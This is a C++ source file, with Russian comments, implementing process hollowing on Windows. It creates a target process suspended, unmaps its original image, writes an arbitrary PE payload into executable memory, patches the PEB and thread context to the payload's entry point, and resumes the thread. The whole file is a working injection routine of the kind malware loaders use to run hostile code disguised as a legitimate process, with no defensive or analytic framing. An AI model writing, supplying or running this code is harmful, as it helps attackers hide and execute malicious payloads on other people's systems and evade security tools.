#include "process_hollowing.h"
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

// Типы для NtUnmapViewOfSection и NtQueryInformationProcess
typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

bool ProcessHollowing(const std::wstring& targetPath, const std::vector<uint8_t>& payload, std::wstring* error) {
    if (payload.size() < sizeof(IMAGE_DOS_HEADER)) {
        if (error) *error = L"Invalid PE: too small";
        return false;
    }

    // Проверяем DOS header
    auto dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(payload.data());
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        if (error) *error = L"Invalid PE: no DOS signature";
        return false;
    }

    if (dosHeader->e_lfanew >= payload.size() || dosHeader->e_lfanew < 0) {
        if (error) *error = L"Invalid PE: bad e_lfanew";
        return false;
    }

    // Проверяем NT headers
    auto ntHeaders = reinterpret_cast<const IMAGE_NT_HEADERS*>(payload.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        if (error) *error = L"Invalid PE: no NT signature";
        return false;
    }

    // Создаем процесс в suspended состоянии
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    
    if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        if (error) *error = L"Failed to create suspended process";
        return false;
    }

    bool success = false;
    do {
        // Получаем информацию о процессе через PEB
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) {
            if (error) *error = L"Failed to get ntdll handle";
            break;
        }

        auto NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(ntdll, "NtQueryInformationProcess");
        auto NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
        
        if (!NtQueryInformationProcess || !NtUnmapViewOfSection) {
            if (error) *error = L"Failed to get NT functions";
            break;
        }

        // Получаем PEB процесса
        PROCESS_BASIC_INFORMATION pbi = {};
        NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, 
                                                   &pbi, sizeof(pbi), NULL);
        if (status != 0) {
            if (error) *error = L"Failed to query process information";
            break;
        }

        // Читаем базовый адрес образа из PEB
        PVOID imageBase = nullptr;
        SIZE_T bytesRead = 0;
        if (!ReadProcessMemory(pi.hProcess, 
                              (PVOID)((ULONG_PTR)pbi.PebBaseAddress + sizeof(PVOID) * 2),
                              &imageBase, sizeof(imageBase), &bytesRead) || bytesRead != sizeof(imageBase)) {
            if (error) *error = L"Failed to read image base from PEB";
            break;
        }

        // Отключаем оригинальный образ
        status = NtUnmapViewOfSection(pi.hProcess, imageBase);
        // Игнорируем ошибку - образ может уже быть отключен

        // Выделяем память для нового образа
        PVOID newImageBase = VirtualAllocEx(pi.hProcess, 
                                           (PVOID)ntHeaders->OptionalHeader.ImageBase,
                                           ntHeaders->OptionalHeader.SizeOfImage,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!newImageBase) {
            // Пробуем выделить по любому адресу
            newImageBase = VirtualAllocEx(pi.hProcess, NULL,
                                         ntHeaders->OptionalHeader.SizeOfImage,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!newImageBase) {
                if (error) *error = L"Failed to allocate memory in target process";
                break;
            }
        }

        // Записываем заголовки PE
        SIZE_T bytesWritten = 0;
        if (!WriteProcessMemory(pi.hProcess, newImageBase, payload.data(),
                               ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten)) {
            if (error) *error = L"Failed to write PE headers";
            break;
        }

        // Записываем секции
        auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        bool sectionsOk = true;
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0 && 
                sectionHeader[i].PointerToRawData < payload.size()) {
                
                PVOID sectionDest = (PVOID)((ULONG_PTR)newImageBase + sectionHeader[i].VirtualAddress);
                const void* sectionSrc = payload.data() + sectionHeader[i].PointerToRawData;
                DWORD sectionSize = min(sectionHeader[i].SizeOfRawData, 
                                       (DWORD)(payload.size() - sectionHeader[i].PointerToRawData));
                
                if (!WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc,
                                       sectionSize, &bytesWritten)) {
                    if (error) *error = L"Failed to write PE section " + std::to_wstring(i);
                    sectionsOk = false;
                    break;
                }
            }
        }
        
        if (!sectionsOk) break;

        // Обновляем базовый адрес в PEB, если он изменился
        if (newImageBase != (PVOID)ntHeaders->OptionalHeader.ImageBase) {
            if (!WriteProcessMemory(pi.hProcess, 
                                   (PVOID)((ULONG_PTR)pbi.PebBaseAddress + sizeof(PVOID) * 2),
                                   &newImageBase, sizeof(newImageBase), &bytesWritten)) {
                if (error) *error = L"Failed to update image base in PEB";
                break;
            }
        }

        // Получаем и обновляем контекст потока
        CONTEXT context = {};
        context.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &context)) {
            if (error) *error = L"Failed to get thread context";
            break;
        }

        // Устанавливаем точку входа
        ULONG_PTR entryPoint = (ULONG_PTR)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#ifdef _WIN64
        context.Rcx = entryPoint;
#else
        context.Eax = entryPoint;
#endif

        if (!SetThreadContext(pi.hThread, &context)) {
            if (error) *error = L"Failed to set thread context";
            break;
        }

        success = true;
    } while (false);

    if (success) {
        ResumeThread(pi.hThread);
    } else {
        TerminateProcess(pi.hProcess, 1);
    }
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return success;
}